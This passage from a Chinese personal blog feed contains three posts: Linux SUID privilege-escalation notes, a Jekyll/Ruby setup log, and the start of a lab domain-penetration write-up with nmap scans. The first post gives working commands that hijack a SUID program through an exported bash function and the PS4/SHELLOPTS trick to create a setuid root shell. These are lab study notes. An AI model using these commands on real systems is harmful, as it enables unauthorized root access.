class="hljs-variable">$HOME</span><br>什么是环境变量：<br>可以使用export命令去定义环境变量<br>比如说：<br>环境变量与terminal终端息息相关，当打开了一个terminal，它就会自动加载环境<br>变量。<br>如何去使用环境变量：<br>export b=<span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><br>ping -c <span class="hljs-number">4</span> <span class="hljs-variable">$b</span><br><br></code></pre></div></td></tr></table></figure><h3 id="案例一："><a href="#案例一：" class="headerlink" title="案例一："></a>案例一：</h3><p>首先了解一下export命令</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/service() &#123; cp /</span>bin<span class="hljs-regexp">/bash /</span>tmp &amp;&amp; chmod +s <span class="hljs-regexp">/tmp/</span>bash &amp;&amp; <span class="hljs-regexp">/tmp/</span>bash -p; &#125;<br><br>export -f <span class="hljs-regexp">/usr/</span>sbin/service<br><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>suid-env2<br><br>env -i SHELLOPTS=xtrace PS4=<span class="hljs-string">&#x27;$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +s /tmp/bash)&#x27;</span> <span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-string">&#x27;/usr/local/bin/suid-env2; set +x; /tmp/bash -p&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="案例二："><a href="#案例二：" class="headerlink" title="案例二："></a>案例二：</h3><p>明确两个东西，一个是环境变量，一个是函数</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/service() &#123; cp /</span>bin<span class="hljs-regexp">/bash /</span>tmp &amp;&amp; chmod +s <span class="hljs-regexp">/tmp/</span>bash &amp;&amp; <span class="hljs-regexp">/tmp/</span>bash -p; &#125;<br><br><span class="hljs-regexp">//</span>   <span class="hljs-string">&quot;/usr/sbin/service&quot;</span> 函数名称<br><span class="hljs-regexp">//</span>   bash 定义一个很像service绝对路径的函数<br><br>export -f <span class="hljs-regexp">/usr/</span>sbin/service<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>suid-env2<br><span class="hljs-regexp">//</span>  将这个函数“<span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/service”保存到环境变量，并去执行suid程序“/u</span>sr<span class="hljs-regexp">/local/</span>bin/suid-env2”<br><span class="hljs-regexp">//</span>   suid程序本来是想去执行service apache2 start，<span class="hljs-regexp">/usr/</span>sbin/service<br>cp <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/tmp &amp;&amp; chmod +s /</span>tmp<span class="hljs-regexp">/bash &amp;&amp; /</span>tmp/bash -p;<br><br></code></pre></div></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></li><li><div class="hljs code-wrapper"><pre><code>[https://camo.githubusercontent.com/acb487594dbe457b6711a0a70eb545ec828159a8/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067](https://camo.githubusercontent.com/acb487594dbe457b6711a0a70eb545ec828159a8/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067)</code></pre></div></li><li><a href="https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/">https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/</a></li><li><a href="https://bash.cyberciti.biz/guide/Pass_arguments_into_a_function">https://bash.cyberciti.biz/guide/Pass_arguments_into_a_function</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于ruby的jekyll博客搭建踩坑记录</title>
    <link href="/2020/08/26/08-x/"/>
    <url>/2020/08/26/08-x/</url>
    
    <content type="html"><![CDATA[<p>一件事，只要是有价值的，花再长的时间去做也是值得的。</p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><p>使用某些地区的网络就能访问，有些地区就不能。<br>挂梯子也访问不了了。（不知道是被墙了还是什么原因）<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/2020-08-26-08/1.PNG" alt="1"></p><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">ruby -v<br>sqlite3 --version<br>gem <span class="hljs-keyword">install </span>rails<br>gem <span class="hljs-keyword">install </span><span class="hljs-keyword">jekyll</span><br><span class="hljs-keyword"></span><br>确保ruby环境已安装，数据库已安装。<br><span class="hljs-keyword">bundle </span><span class="hljs-keyword">install</span><br><span class="hljs-keyword"></span>开始安装<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/2020-08-26-08/2.PNG" alt="2"><br>好像不能用root权限执行，新建一个普通用户</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">useradd</span> whale<br>passwd whale<br>visudo<br>添加whale到sudoer用户组<br></code></pre></div></td></tr></table></figure><p>再次运行就没问题了。<br>bundle install<br>等待许久，安装依赖。</p><h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">先测试内网ip<br><span class="hljs-keyword">bundle </span>exec <span class="hljs-keyword">jekyll </span>serve<br><br><span class="hljs-keyword">bundle </span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/2020-08-26-08/3.PNG" alt="3"></p><p>没问题了，再运行在外网ip上。</p><p>在vps上运行</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Whale3070/</span>Whale3070.github.io<br>bundle exec jekyll serve --host=外网ip<br></code></pre></div></td></tr></table></figure><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ol><li>更新</li></ol><p>1.1 ruby更新<br>升级到ruby 2.6<br>在ruby 2.5.1运行会出现问题。jekyll不支持</p><p>解决办法：卸载老版本的ruby，然后重装新版本的。</p><p>1.2 gem更新<br>gem -v<br>3.0.3<br>gem update –system</p><p>1.3 bundler更新<br>bundle update –bundler</p><ol start="2"><li>bundle install报错</li></ol><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/2020-08-26-08/4.PNG" alt="4"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">apt-get install ruby-dev<br>执行成功<br>gem install commonmarker -v <span class="hljs-string">&#x27;0.17.13&#x27;</span> --source <span class="hljs-string">&#x27;https://rubygems.org/&#x27;</span><br>执行失败<br>gem install commonmarker<br>执行失败，报错<br>ruby -v<br>执行成功<br>rvm<br>执行失败<br>curl -sSL https:<span class="hljs-regexp">//</span>rvm.io/mpapis.asc | sudo gpg --import -<br>curl -sSL https:<span class="hljs-regexp">//</span>rvm.io/pkuczynski.asc | sudo gpg --import -<br>curl -L https:<span class="hljs-regexp">//g</span>et.rvm.io | bash -s stable<br>执行成功<br>rvm list<br>执行失败<br>cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/rvm/</span>bin;./rvm list known<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/2020-08-26-08/5.PNG" alt="5"></p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">./rvm <span class="hljs-keyword">install</span> <span class="hljs-number">2.7</span>.<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/2020-08-26-08/6.PNG" alt="6"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">./rvm</span> list<br><span class="hljs-string">./rvm</span> 2.7.0 <span class="hljs-params">--default</span><br><br>gem install rails<br>rails <span class="hljs-params">--version</span><br>bundle install<br>bundle exec jekyll serve<br>执行成功<br>访问http:<span class="hljs-string">//127.0.0.1</span><span class="hljs-function">:4000</span>，没问题以后，再架设到外部ip<br></code></pre></div></td></tr></table></figure><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>ifconfig，发现vps只有两个内网ip，并且无法绑定到弹性ip上。</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">ps -ef | <span class="hljs-keyword">grep</span> jekyll<br>bundle <span class="hljs-keyword">exec</span> jekyll serve --host=<span class="hljs-number">172.31</span>.<span class="hljs-number">10.237</span><br></code></pre></div></td></tr></table></figure><h2 id="图片挂了"><a href="#图片挂了" class="headerlink" title="图片挂了"></a>图片挂了</h2><p>发现raw.githubusercontent.com被墙了。<br>写一个脚本，将下列字符串做一个替换</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">raw.githubusercontent.com/Whale3070/Whale3070.github.io/master<br>替换为<br>18.166.144.145:4000<br><br>sed -i &#x27;s/https:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>raw.githubusercontent.com<span class="hljs-symbol">\/</span>Whale3070<span class="hljs-symbol">\/</span>Whale3070.github.io<span class="hljs-symbol">\/</span>master/http:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>18.166.144.145:4000/g&#x27; 2020-05-13*<br><br>测试没问题，图片好了以后，进行全局替换<br>sed -i &#x27;s/https:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>raw.githubusercontent.com<span class="hljs-symbol">\/</span>Whale3070<span class="hljs-symbol">\/</span>Whale3070.github.io<span class="hljs-symbol">\/</span>master/http:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>18.166.144.145:4000/g&#x27; _posts/*.md<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/2020-08-26-08/7.PNG" alt="7"></p><p>确认没问题，在加-i参数<br>sed -i ‘s/raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/18.166.144.145:4000/g’ 2020-05-13*</p><h2 id="ruby报错"><a href="#ruby报错" class="headerlink" title="ruby报错"></a>ruby报错</h2><p>/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:10: warning: constant Gem::ConfigMap is deprecated<br><a href="https://github.com/rubygems/rubygems/issues/3068">https://github.com/rubygems/rubygems/issues/3068</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ruby-china.github.io/rails-guides/getting_started.html">https://ruby-china.github.io/rails-guides/getting_started.html</a></p><p><a href="https://www.jekyll.com.cn/docs/">https://www.jekyll.com.cn/docs/</a></p>]]></content>
    
    
    <categories>
      
      <category>blog</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验域渗透（一）</title>
    <link href="/2020/08/05/10-x/"/>
    <url>/2020/08/05/10-x/</url>
    
    <content type="html"><![CDATA[<h1 id="实验域渗透（一）"><a href="#实验域渗透（一）" class="headerlink" title="实验域渗透（一）"></a>实验域渗透（一）</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448905283&idx=1&sn=3feb7e4af22dfc360a365f9dd4fb5c53&exportkey=AU/8L3oA1rtv8wTAoim67OY=&pass_ticket=NSPT1MXRIl+OJ48vM/uhoBzHVJwyGCL5vjaYPTFCuEyM4BxrmGjWM6844nz57BHg&wx_header=0">域环境下载地址</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> scan report for <span class="hljs-number">192.168.28.10</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">00027</span>s latency).<br><span class="hljs-attribute">MAC</span> Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">85</span>:<span class="hljs-number">19</span>:D<span class="hljs-number">4</span> (VMware)<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">192.168.28.20</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">00043</span>s latency).<br></code></pre></div></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="失败的尝试（可以不用看这部分）"><a href="#失败的尝试（可以不用看这部分）" class="headerlink" title="失败的尝试（可以不用看这部分）"></a>失败的尝试（可以不用看这部分）</h3><h4 id="域成员机器——二零"><a href="#域成员机器——二零" class="headerlink" title="域成员机器——二零"></a>域成员机器——二零</h4><p>nmap -sS 192.168.28.20</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-number">135</span>/tcp   <span class="hljs-keyword">open</span>  msrpc<br><span class="hljs-number">139</span>/tcp   <span class="hljs-keyword">open</span>  netbios-ssn<br><span class="hljs-number">445</span>/tcp   <span class="hljs-keyword">open</span>  microsoft-ds<br><span class="hljs-number">49152</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49153</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49154</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49155</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br><span class="hljs-number">49156</span>/tcp <span class="hljs-keyword">open</span>  <span class="hljs-type">unknown</span><br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span> (VMware)<br></code></pre></div></td></tr></table></figure><p>masscan -p1-65535,U:1-65535 192.168.28.20 –rate=1000 -p1-65535,U:1-65535 -e eth0 </p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">无法扫描<br><span class="hljs-symbol">FAIL:</span> failed <span class="hljs-keyword">to</span> detect router <span class="hljs-keyword">for</span> <span class="hljs-keyword">interface</span>: <span class="hljs-string">&quot;eth0&quot;</span><br> [hint] <span class="hljs-keyword">try</span> something <span class="hljs-built_in">like</span> <span class="hljs-string">&quot;--router-mac 66-55-44-33-22-11&quot;</span> <span class="hljs-keyword">to</span> specify router<br> [hint] <span class="hljs-keyword">try</span> something <span class="hljs-built_in">like</span> <span class="hljs-string">&quot;--interface eth0&quot;</span> <span class="hljs-keyword">to</span> change <span class="hljs-keyword">interface</span><br></code></pre></div></td></tr></table></figure><p>nmap -sV 192.168.28.20</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">192.168.28.20</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">00062</span>s latency).<br><span class="hljs-attribute">Not</span> shown: <span class="hljs-number">992</span> closed ports<br><span class="hljs-attribute">PORT</span>      STATE SERVICE      VERSION<br><span class="hljs-attribute">135</span>/tcp   open  msrpc        Microsoft Windows RPC<br><span class="hljs-attribute">139</span>/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br><span class="hljs-attribute">445</span>/tcp   open  microsoft-ds Microsoft Windows Server <span class="hljs-number">2008</span> R<span class="hljs-number">2</span> - <span class="hljs-number">2012</span> microsoft-ds<br><span class="hljs-attribute">49152</span>/tcp open  msrpc        Microsoft Windows RPC<br><span class="hljs-attribute">49153</span>/tcp open  msrpc        Microsoft Windows RPC<br><span class="hljs-attribute">49154</span>/tcp open  msrpc        Microsoft Windows RPC<br><span class="hljs-attribute">49155</span>/tcp open  msrpc        Microsoft Windows RPC<br><span class="hljs-attribute">49156</span>/tcp open  msrpc        Microsoft Windows RPC<br><span class="hljs-attribute">MAC</span> Address: <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span> (VMware)<br><span class="hljs-attribute">Service</span> Info: OSs: Windows, Windows Server <span class="hljs-number">2008</span> R<span class="hljs-number">2</span> - <span class="hljs-number">2012</span>; CPE: cpe:/o:microsoft:windows<br></code></pre></div></td></tr></table></figure><h4 id="检查445端口"><a href="#检查445端口" class="headerlink" title="检查445端口"></a>检查445端口</h4><p>在这里有两个分支，广度搜索1-65535端口，看是否有漏掉的端口开放。深度搜索445端口，是否有未授权访问或者弱口令等漏洞。</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">nmap --script safe -p445 <span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.20</span><br>Pre-scan script results:<br>| <span class="hljs-type">broadcast</span>-igmp-discovery: <br>|   <span class="hljs-type">192</span><span class="hljs-number">.168</span><span class="hljs-number">.28</span><span class="hljs-number">.1</span><br>|     <span class="hljs-type">Interface</span>: eth0<br>|     <span class="hljs-type">Version</span>: <span class="hljs-number">2</span><br>|     <span class="hljs-type">Group</span>: <span class="hljs-number">224.0</span><span class="hljs-number">.0</span><span class="hljs-number">.251</span><br>|     <span class="hljs-type">Description</span>: mDNS (rfc6762)<br>|   <span class="hljs-type">192</span><span class="hljs-number">.168</span><span class="hljs-number">.28</span><span class="hljs-number">.10</span><br>|     <span class="hljs-type">Interface</span>: eth0<br>|     <span class="hljs-type">Version</span>: <span class="hljs-number">2</span><br>|     <span class="hljs-type">Group</span>: <span class="hljs-number">224.0</span><span class="hljs-number">.0</span><span class="hljs-number">.252</span><br>|     <span class="hljs-type">Description</span>: Link-local Multicast Name Resolution (rfc4795)<br>|   <span class="hljs-type">192</span><span class="hljs-number">.168</span><span class="hljs-number">.28</span><span class="hljs-number">.1</span><br>|     <span class="hljs-type">Interface</span>: eth0<br>|     <span class="hljs-type">Version</span>: <span class="hljs-number">2</span><br>|     <span class="hljs-type">Group</span>: <span class="hljs-number">239.192</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>|     <span class="hljs-type">Description</span>: Organization-<span class="hljs-keyword">Local</span> <span class="hljs-keyword">Scope</span> (rfc2365)<br>|   <span class="hljs-type">192</span><span class="hljs-number">.168</span><span class="hljs-number">.28</span><span class="hljs-number">.1</span><br>|     <span class="hljs-type">Interface</span>: eth0<br>|     <span class="hljs-type">Version</span>: <span class="hljs-number">2</span><br>|     <span class="hljs-type">Group</span>: <span class="hljs-number">239.255</span><span class="hljs-number">.255</span><span class="hljs-number">.250</span><br>|     <span class="hljs-type">Description</span>: Organization-<span class="hljs-keyword">Local</span> <span class="hljs-keyword">Scope</span> (rfc2365)<br>|<span class="hljs-type">_</span>  Use the newtargets script-arg to add the results <span class="hljs-built_in">as</span> targets<br>| <span class="hljs-type">broadcast</span>-listener: <br>|   <span class="hljs-type">ether</span><br>|       <span class="hljs-type">ARP</span> Request<br>|         <span class="hljs-type">sender</span> ip      sender mac         target ip<br>|         <span class="hljs-type">192</span><span class="hljs-number">.168</span><span class="hljs-number">.28</span><span class="hljs-number">.10</span>  <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">85</span>:<span class="hljs-number">19</span>:D4  <span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.2</span><br>|   <span class="hljs-type">udp</span><br>|       <span class="hljs-type">SSDP</span><br>|         <span class="hljs-type">ip</span>            uri<br>|<span class="hljs-type">_</span>        <span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.1</span>   urn:dial-multiscreen-org:service:dial:<span class="hljs-number">1</span><br>|<span class="hljs-type">_broadcast</span>-xdmcp-discover: ERROR<br>|<span class="hljs-type">_eap</span>-info: please specify an interface <span class="hljs-built_in">with</span> -e<br>| <span class="hljs-type">knx</span>-gateway-discover: <br>|<span class="hljs-type">_</span> ERROR: Couldn&#x27;t get interface <span class="hljs-keyword">for</span> <span class="hljs-number">224.0</span><span class="hljs-number">.23</span><span class="hljs-number">.12</span><br>| <span class="hljs-type">targets</span>-asn: <br>|<span class="hljs-type">_</span>  targets-asn.asn is a mandatory parameter<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.20</span><br>Host is up (<span class="hljs-number">0.00080</span>s latency).<br><br>PORT    STATE SERVICE<br><span class="hljs-number">445</span>/tcp open  microsoft-ds<br>|<span class="hljs-type">_smb</span>-enum-services: ERROR: <span class="hljs-keyword">Script</span> execution failed (use -d to debug)<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span> (VMware)<br><br>Host script results:<br>| <span class="hljs-type">dns</span>-blacklist: <br>|   <span class="hljs-type">SPAM</span><br>|     <span class="hljs-type">bl</span>.spamcop.net - FAIL<br>|     <span class="hljs-type">sbl</span>.spamhaus.org - FAIL<br>|     <span class="hljs-type">spam</span>.dnsbl.sorbs.net - FAIL<br>|     <span class="hljs-type">bl</span>.nszones.com - FAIL<br>|     <span class="hljs-type">l2</span>.apews.org - FAIL<br>|     <span class="hljs-type">dnsbl</span>.inps.de - FAIL<br>|     <span class="hljs-type">all</span>.spamrats.com - FAIL<br>|     <span class="hljs-type">list</span>.quorum.to - FAIL<br>|   <span class="hljs-type">PROXY</span><br>|     <span class="hljs-type">misc</span>.dnsbl.sorbs.net - FAIL<br>|     <span class="hljs-type">http</span>.dnsbl.sorbs.net - FAIL<br>|     <span class="hljs-type">socks</span>.dnsbl.sorbs.net - FAIL<br>|     <span class="hljs-type">tor</span>.dan.me.uk - FAIL<br>|     <span class="hljs-type">dnsbl</span>.tornevall.org - FAIL<br>|   <span class="hljs-type">ATTACK</span><br>|<span class="hljs-type">_</span>    all.bl.blocklist.de - FAIL<br>|<span class="hljs-type">_fcrdns</span>: FAIL (No PTR <span class="hljs-built_in">record</span>)<br>|<span class="hljs-type">_ipidseq</span>: Unknown<br>|<span class="hljs-type">_msrpc</span>-enum: No accounts <span class="hljs-built_in">left</span> to <span class="hljs-built_in">try</span><br>|<span class="hljs-type">_nbstat</span>: NetBIOS name: WIN-BBMAQT15JMD, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span>:<span class="hljs-number">51</span>:<span class="hljs-number">36</span> (VMware)<br>|<span class="hljs-type">_path</span>-mtu: PMTU == <span class="hljs-number">1500</span><br>| <span class="hljs-type">smb</span>-mbenum: 